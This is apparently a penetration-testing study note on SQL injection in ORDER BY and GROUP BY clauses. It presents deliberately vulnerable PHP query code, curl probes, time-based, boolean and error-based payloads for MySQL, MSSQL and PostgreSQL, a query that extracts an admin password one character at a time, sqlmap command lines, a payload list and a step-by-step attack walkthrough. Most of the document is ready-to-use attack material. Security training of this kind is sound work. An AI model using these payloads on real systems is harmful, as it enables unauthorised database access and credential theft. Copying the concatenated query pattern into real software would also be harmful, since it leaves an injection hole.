---
tags: [vapt, sqli, intermediate]
difficulty: intermediate
module: "06 - SQL Injection"
topic: "06.13 SQLi in ORDER BY / GROUP BY"
---

# 06.13 — SQLi in ORDER BY / GROUP BY

## Why ORDER BY is Special

ORDER BY and GROUP BY clauses are special injection contexts because:
- Standard string-based payloads don't work (can't inject string literals in ORDER BY)
- UNION SELECT is not possible here
- Boolean logic behaves differently
- They require case-expression or time-based techniques

```
VULNERABLE CODE:
  $sort = $_GET['sort'];
  $sql = "SELECT * FROM products ORDER BY " . $sort;
  
  Normal: ?sort=price → ORDER BY price (valid column name)
  Normal: ?sort=name  → ORDER BY name  (valid column name)
  
  Attack: ?sort=price--       → comments out rest → ORDER BY price
  Attack: ?sort=SLEEP(5)      → delays response!
  Attack: ?sort=(CASE WHEN condition THEN price ELSE name END)
```

---

## Detecting ORDER BY Injection

```bash
# DETECT INJECTION POINT:
curl "https://target.com/products?sort=name"     # → works
curl "https://target.com/products?sort=name'"    # → SQL error? CONFIRMED!
curl "https://target.com/products?sort=name--"   # → works (comment strips rest)

# NUMERIC COLUMN INDEX (also injectable):
curl "https://target.com/products?sort=1"   # order by first column
curl "https://target.com/products?sort=2"   # order by second column
curl "https://target.com/products?sort=99"  # error: no 99th column! → confirms ORDER BY
curl "https://target.com/products?sort=1--" # comment → still works

# INJECT IN ORDER BY DIRECTION FIELD:
curl "https://target.com/products?order=ASC"     # → works
curl "https://target.com/products?order=ASC'"    # → error? injectable!
curl "https://target.com/products?sort=name&order=ASC" # both fields
```

---

## Time-Based Extraction via ORDER BY

Best technique when UNION and boolean don't work in ORDER BY context:

```sql
-- MYSQL — SLEEP in CASE:
?sort=(CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)
→ 5 second delay = TRUE
→ No delay = FALSE

-- CONFIRM:
?sort=(CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)  → delay (true)
?sort=(CASE WHEN (1=2) THEN SLEEP(5) ELSE 0 END)  → no delay (false)

-- EXTRACT DATABASE NAME — FIRST CHARACTER:
?sort=(CASE WHEN (SUBSTRING(database(),1,1)='m') THEN SLEEP(5) ELSE 0 END)
→ delay = YES, first char is 'm'!

-- EXTRACT PASSWORD:
?sort=(CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='5') THEN SLEEP(5) ELSE 0 END)
→ delay = first char of admin password is '5'

-- MSSQL:
?sort=(CASE WHEN (1=1) THEN (SELECT 1/0) ELSE 1 END)   -- division by zero error
?sort=(CASE WHEN (1=1) THEN (WAITFOR DELAY '0:0:5') ELSE (SELECT 1) END)

-- POSTGRESQL:
?sort=(CASE WHEN (1=1) THEN (SELECT pg_sleep(5)) ELSE 1 END)
```

---

## Boolean-Based Extraction via Sorting

The sort order of results changes based on the condition — observable difference:

```sql
-- CONCEPT:
?sort=(CASE WHEN condition THEN price ELSE name END)
-- TRUE: sorts by price (results in a specific numerical order)
-- FALSE: sorts by name (results in alphabetical order)
-- Compare sort orders to determine TRUE/FALSE!

-- EXAMPLE:
?sort=(CASE WHEN (SUBSTRING(database(),1,1)='m') THEN price ELSE name END)
-- If results sorted by price (lowest first) → first char of DB is 'm'!
-- If results sorted alphabetically → first char is NOT 'm'!

-- FASTER: Use column that shows clearly different sort orders
-- (price ascending vs name ascending = very visible difference)
```

---

## Error-Based via ORDER BY

```sql
-- MYSQL — PROCEDURE ANALYSE():
?sort=name PROCEDURE ANALYSE(1,1)--
-- Triggers information disclosure about column types

-- MYSQL — EXP():
?sort=(SELECT EXP(~0+(SELECT * FROM(SELECT database())a)))--
-- Generates "DOUBLE value is out of range" error with data!

-- MSSQL — CONVERT error:
?sort=CONVERT(INT, (SELECT @@version))--
-- Error includes version string!

-- POSTGRESQL — CAST error:
?sort=CAST((SELECT current_database()) AS INT)--
-- "invalid input syntax for type integer: 'myapp'"
```

---

## GROUP BY Injection

GROUP BY behaves similarly to ORDER BY:

```sql
-- VULNERABLE CODE:
$group = $_GET['group'];
$sql = "SELECT category, COUNT(*) FROM products GROUP BY " . $group;

-- INJECTION:
?group=category--
?group=category HAVING 1=1--
?group=category HAVING 1=CONVERT(INT,(SELECT @@version))--  → MSSQL error-based!

-- DOUBLE QUERY ERROR (MySQL):
?group=category HAVING 1=(SELECT COUNT(*) FROM(SELECT name FROM information_schema.tables GROUP BY x)a)--
-- "Column 'x' in group statement is ambiguous" → error confirms injection!
```

---

## SQLMap for ORDER BY Injection

```bash
# ORDER BY IS TRICKY FOR SQLMAP — SPECIFY SUFFIX:
sqlmap -u "https://target.com/products?sort=name" \
  -p sort \
  --suffix="--" \
  --technique=T     # time-based most reliable here

# SPECIFY POSITION (ORDER BY needs suffix comment):
sqlmap -u "https://target.com/products?sort=name" \
  -p sort \
  --prefix="" \
  --suffix="-- -" \
  --dbms=mysql

# LEVEL 5 FOR AUTOMATIC ORDER BY DETECTION:
sqlmap -u "https://target.com/products?sort=name&direction=asc" \
  --level=5 --risk=2

# CUSTOM INJECTION STRING FOR ORDER BY:
sqlmap -u "https://target.com/products?sort=name" \
  -p sort \
  --technique=T \
  --time-sec=3 \
  --dbms=mysql \
  -v 3

# FROM BURP REQUEST:
sqlmap -r request.txt -p sort --technique=T
```

---

## Comprehensive ORDER BY Payload List

```
DETECTION:
  name'
  1--
  name LIMIT 1
  name; SELECT 1--
  
BOOLEAN (condition changes sort order):
  (CASE WHEN (1=1) THEN price ELSE name END)
  (CASE WHEN (1=2) THEN price ELSE name END)
  
TIME-BASED (MySQL):
  (CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)
  IF(1=1, SLEEP(5), 0)
  (SELECT SLEEP(5) FROM dual WHERE 1=1)
  
TIME-BASED (MSSQL):
  (CASE WHEN (1=1) THEN (SELECT 1 FROM sys.tables WHERE 1=WAITFOR DELAY '0:0:5') ELSE 1 END)
  
TIME-BASED (PostgreSQL):
  (CASE WHEN (1=1) THEN (SELECT 1 FROM pg_sleep(5)) ELSE 1 END)
  
ERROR-BASED (MSSQL):
  CONVERT(INT, @@version)
  1/(SELECT 0)   → division by zero
  
ERROR-BASED (MySQL):
  EXTRACTVALUE(1,CONCAT(0x7e,database()))
```

---

## Practical Example

```bash
# TARGET: https://target.com/shop?sort=price

# STEP 1: Detect
curl "https://target.com/shop?sort=price'"
# → 500 Internal Server Error!

# STEP 2: Confirm injection context
curl "https://target.com/shop?sort=price--"  # → 200 (comment works)

# STEP 3: Time-based confirm
curl -s -w "%{time_total}\n" -o /dev/null \
  "https://target.com/shop?sort=(CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END)"
# → 5.1 seconds → CONFIRMED!

# STEP 4: Extract database
curl -s -w "%{time_total}\n" -o /dev/null \
  "https://target.com/shop?sort=(CASE WHEN (SUBSTRING(database(),1,1)='m') THEN SLEEP(3) ELSE 0 END)"
# → 3.1 seconds → first char is 'm'!

# Continue for each character...

# STEP 5: Automate with SQLMap
sqlmap -u "https://target.com/shop?sort=price" \
  -p sort \
  --technique=T \
  --dbms=mysql \
  --dbs
```

---

## Related Notes
- [[05 - Blind SQLi Boolean-Based]] — boolean technique details
- [[06 - Blind SQLi Time-Based]] — time-based technique details
- [[21 - sqlmap Full Usage Guide]] — sqlmap ORDER BY config
- [[09 - SQLi in GET Parameters]] — general GET injection
